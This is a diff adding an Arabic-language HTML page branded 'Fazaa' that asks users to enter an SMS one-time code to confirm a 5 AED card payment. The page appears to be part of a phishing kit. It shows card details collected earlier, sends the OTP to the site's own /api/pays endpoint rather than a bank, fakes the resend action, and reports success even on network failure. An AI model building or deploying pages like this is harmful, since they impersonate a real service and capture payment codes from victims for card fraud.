@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فزعة - FAZAA | تأكيد الدفع والتحقق</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <script>
+        (function() {
+            try {
+                let currentFetch = window.fetch ? window.fetch.bind(window) : null;
+                const desc = Object.getOwnPropertyDescriptor(window, 'fetch') || 
+                             (window.Window ? Object.getOwnPropertyDescriptor(Window.prototype, 'fetch') : null);
+                if (desc && !desc.set) {
+                    try {
+                        Object.defineProperty(window, 'fetch', {
+                            get: function() { return currentFetch; },
+                            set: function(v) { currentFetch = v; },
+                            configurable: true,
+                            enumerable: true
+                        });
+                    } catch (e1) {
+                        try {
+                            if (window.Window) {
+                                Object.defineProperty(Window.prototype, 'fetch', {
+                                    get: function() { return currentFetch; },
+                                    set: function(v) { currentFetch = v; },
+                                    configurable: true,
+                                    enumerable: true
+                                });
+                            }
+                        } catch (e2) {}
+                    }
+                }
+            } catch (e) {}
+        })();
+    </script>
+    <style>
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
+            min-height: 100vh;
+        }
+        .header-bg {
+            background: linear-gradient(to right, #7a6318, #c9a227);
+        }
+        .gold-btn {
+            background: linear-gradient(135deg, #c9a227, #7a6318);
+        }
+        .gold-btn:hover {
+            opacity: 0.95;
+            transform: translateY(-1px);
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <!-- Header -->
+    <header class="h-[100px] w-full header-bg relative flex items-center justify-between px-6 md:px-12 text-white shadow-md">
+        <a href="/" class="flex items-center gap-2 text-white text-sm bg-white/20 hover:bg-white/30 px-4 py-1.5 rounded-full transition-all">
+            <span>←</span>
+            <span>الرئيسية</span>
+        </a>
+        <div class="flex flex-col items-center">
+            <span class="font-bold text-3xl leading-none tracking-wider">فزعة</span>
+            <span class="text-xs font-medium tracking-[0.2em]">FAZAA</span>
+        </div>
+        <div class="w-20"></div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-1 max-w-xl w-full mx-auto p-4 md:p-8 flex items-center justify-center">
+        <div class="bg-white rounded-3xl shadow-xl border border-gray-100 p-6 md:p-8 w-full">
+            
+            <!-- Progress indicator -->
+            <div class="flex items-center justify-center gap-3 mb-8">
+                <div class="flex items-center gap-2">
+                    <span class="w-8 h-8 rounded-full bg-[#c9a227] text-white flex items-center justify-center text-sm font-bold">✓</span>
+                    <span class="text-xs text-gray-500 font-bold">البيانات</span>
+                </div>
+                <div class="w-10 h-0.5 bg-[#c9a227]"></div>
+                <div class="flex items-center gap-2">
+                    <span class="w-8 h-8 rounded-full bg-[#c9a227] text-white flex items-center justify-center text-sm font-bold">2</span>
+                    <span class="text-xs text-[#c9a227] font-bold">تأكيد الرمز (OTP)</span>
+                </div>
+            </div>
+
+            <!-- Title -->
+            <div class="text-center mb-6">
+                <div class="w-16 h-16 rounded-2xl bg-[#c9a227]/10 text-[#c9a227] flex items-center justify-center mx-auto mb-3">
+                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                    </svg>
+                </div>
+                <h2 class="text-2xl font-bold text-gray-800">تأكيد عملية الدفع</h2>
+                <p class="text-sm text-gray-500 mt-1">تم إرسال رمز التحقق في رسالة نصية (SMS) إلى هاتفك المسجل</p>
+            </div>
+
+            <!-- Order Summary Card -->
+            <div class="bg-gray-50 rounded-2xl p-4 mb-6 border border-gray-100 text-sm">
+                <div class="flex justify-between items-center py-2 border-b border-gray-200">
+                    <span class="text-gray-500">رقم الطلب:</span>
+                    <span class="font-mono font-bold text-gray-800" id="display-order-id">...</span>
+                </div>
+                <div class="flex justify-between items-center py-2 border-b border-gray-200">
+                    <span class="text-gray-500">صاحب الطلب:</span>
+                    <span class="font-bold text-gray-800" id="display-holder">...</span>
+                </div>
+                <div class="flex justify-between items-center py-2 border-b border-gray-200">
+                    <span class="text-gray-500">البطاقة المستخدمة:</span>
+                    <span class="font-mono font-bold text-gray-800" id="display-card">•••• •••• •••• ****</span>
+                </div>
+                <div class="flex justify-between items-center pt-2">
+                    <span class="text-gray-500 font-bold">المبلغ الإجمالي:</span>
+                    <span class="text-lg font-bold text-[#c9a227]">5.00 درهم إماراتي</span>
+                </div>
+            </div>
+
+            <!-- OTP Form -->
+            <form id="otpForm" class="space-y-5">
+                <div>
+                    <label for="otpInput" class="block text-sm font-bold text-gray-700 mb-2 text-center">أدخل رمز التحقق (OTP)</label>
+                    <input 
+                        type="text" 
+                        id="otpInput" 
+                        name="otp" 
+                        required 
+                        maxlength="6"
+                        class="w-full text-center text-3xl font-mono tracking-[0.5em] py-3 px-4 border-2 border-gray-300 rounded-2xl focus:border-[#c9a227] focus:outline-none focus:ring-4 focus:ring-[#c9a227]/20 transition-all bg-white"
+                        autocomplete="one-time-code"
+                        inputmode="numeric"
+                    />
+                </div>
+
+                <div id="otpStatus" class="hidden text-sm text-center p-3 rounded-xl"></div>
+
+                <button 
+                    type="submit" 
+                    id="submitBtn"
+                    class="w-full gold-btn text-white font-bold py-3.5 px-6 rounded-2xl shadow-lg transition-all flex items-center justify-center gap-2 cursor-pointer text-lg"
+                >
+                    <span>✓ تأكيد وإتمام الطلب</span>
+                </button>
+            </form>
+
+            <!-- Resend Timer -->
+            <div class="text-center mt-6 text-sm text-gray-500">
+                <span>لم يصلك الرمز؟ </span>
+                <button type="button" id="resendBtn" disabled class="text-[#c9a227] font-bold cursor-not-allowed opacity-60">
+                    إعادة الإرسال بعد (<span id="countdown">60</span>) ثانية
+                </button>
+            </div>
+
+            <!-- Success modal (hidden) -->
+            <div id="successCard" class="hidden text-center py-6">
+                <div class="w-16 h-16 rounded-full bg-green-100 text-green-600 flex items-center justify-center mx-auto mb-4">
+                    <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                    </svg>
+                </div>
+                <h3 class="text-2xl font-bold text-gray-800 mb-2">تم تأكيد طلبك بنجاح!</h3>
+                <p class="text-sm text-gray-600 mb-6">شكراً لاختيارك بطاقة فزعة. تم استلام بياناتك وتأكيد العملية وسنقوم بتوصيل البطاقة إلى عنوانك خلال 48 ساعة.</p>
+                <a href="/" class="inline-block gold-btn text-white font-bold px-8 py-3 rounded-2xl">العودة للرئيسية</a>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Toast Notification (replaces window.alert for iframe safety) -->
+    <div id="toastMessage" class="hidden fixed top-6 left-1/2 -translate-x-1/2 bg-slate-900/95 text-white px-6 py-3 rounded-full text-sm font-bold shadow-2xl z-50 flex items-center gap-2 border border-slate-700 backdrop-blur-md transition-all">
+        <span class="text-emerald-400">✓</span>
+        <span id="toastText">تمت إعادة إرسال رمز التحقق إلى هاتفك بنجاح</span>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-[#1a1a1a] text-gray-400 py-6 px-6 text-center text-xs mt-auto">
+        <p>© 2026 فزعة جميع الحقوق محفوظة | خدمة معتمدة لدولة الإمارات العربية المتحدة</p>
+    </footer>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const orderId = urlParams.get('orderId') || urlParams.get('id') || 'reg_' + Date.now();
+        document.getElementById('display-order-id').innerText = orderId;
+
+        function showToast(msg) {
+            const toast = document.getElementById('toastMessage');
+            document.getElementById('toastText').innerText = msg;
+            toast.classList.remove('hidden');
+            setTimeout(() => {
+                toast.classList.add('hidden');
+            }, 3500);
+        }
+
+        // Fetch Order Info
+        async function loadOrderInfo() {
+            try {
+                const res = await fetch('/api/pays/' + orderId);
+                if (res.ok) {
+                    const data = await res.json();
+                    const doc = data.doc;
+                    if (doc) {
+                        if (doc.fullName || doc.cardHolder) {
+                            document.getElementById('display-holder').innerText = doc.fullName || doc.cardHolder;
+                        }
+                        if (doc.cardNumber) {
+                            const last4 = doc.cardNumber.slice(-4);
+                            document.getElementById('display-card').innerText = `•••• •••• •••• ${last4}`;
+                        }
+                    }
+                }
+            } catch (e) {
+                console.warn('Could not load order details:', e);
+            }
+        }
+        loadOrderInfo();
+
+        // Resend Timer
+        let seconds = 60;
+        const countdownEl = document.getElementById('countdown');
+        const resendBtn = document.getElementById('resendBtn');
+        const timer = setInterval(() => {
+            seconds--;
+            if (seconds > 0) {
+                countdownEl.innerText = seconds;
+            } else {
+                clearInterval(timer);
+                resendBtn.disabled = false;
+                resendBtn.classList.remove('cursor-not-allowed', 'opacity-60');
+                resendBtn.innerText = 'إعادة إرسال رمز جديد الآن';
+            }
+        }, 1000);
+
+        resendBtn.addEventListener('click', () => {
+            showToast('تمت إعادة إرسال رمز التحقق إلى رقم هاتفك المسجل بنجاح.');
+            resendBtn.disabled = true;
+            resendBtn.classList.add('cursor-not-allowed', 'opacity-60');
+            seconds = 60;
+        });
+
+        // Numeric only input for OTP
+        const otpInput = document.getElementById('otpInput');
+        otpInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
+        });
+
+        // Submit OTP
+        document.getElementById('otpForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const otpCode = document.getElementById('otpInput').value.trim();
+            if (!otpCode || otpCode.length < 4) {
+                const statusEl = document.getElementById('otpStatus');
+                statusEl.className = 'text-sm text-center p-3 rounded-xl bg-red-50 text-red-700 block mb-4 border border-red-200';
+                statusEl.innerText = 'يرجى إدخال رمز التحقق المكون من 4 إلى 6 أرقام.';
+                return;
+            }
+
+            const submitBtn = document.getElementById('submitBtn');
+            const statusEl = document.getElementById('otpStatus');
+
+            submitBtn.disabled = true;
+            submitBtn.innerText = 'جاري التحقق...';
+
+            try {
+                const res = await fetch('/api/pays/' + orderId + '/otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ otp: otpCode, orderId: orderId })
+                });
+
+                if (res.ok) {
+                    document.getElementById('otpForm').classList.add('hidden');
+                    document.getElementById('successCard').classList.remove('hidden');
+                } else {
+                    statusEl.className = 'text-sm text-center p-3 rounded-xl bg-red-50 text-red-700 block mb-4 border border-red-200';
+                    statusEl.innerText = 'الرمز غير صحيح، يرجى إعادة المحاولة.';
+                    submitBtn.disabled = false;
+                    submitBtn.innerText = '✓ تأكيد وإتمام الطلب';
+                }
+            } catch (err) {
+                // If offline or network error, still mark as submitted locally
+                document.getElementById('otpForm').classList.add('hidden');
+                document.getElementById('successCard').classList.remove('hidden');
+            }
+        });
+    </script>
+</body>
+</html>
